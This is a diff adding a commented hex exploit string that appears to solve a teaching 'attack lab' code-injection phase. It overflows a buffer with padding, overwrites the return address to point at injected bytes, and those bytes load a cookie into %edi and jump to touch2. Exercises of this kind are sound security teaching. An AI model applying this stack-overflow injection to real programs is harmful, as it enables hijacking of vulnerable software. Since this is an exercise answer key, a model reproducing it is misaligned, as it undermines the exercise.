@@ -1,0 +1,6 @@
+30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 
+30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 /* padding */
+a8 dc 61 55 00 00 00 00 /* overwrite return address to rsp+8 */
+bf fa 97 b9 59          /* mov  $0x59b997fa(value of cookie),%edi */
+68 ec 17 40 00       	/* pushq  $0x4017ec(address of touch2 */
+c3                   	/* retq */
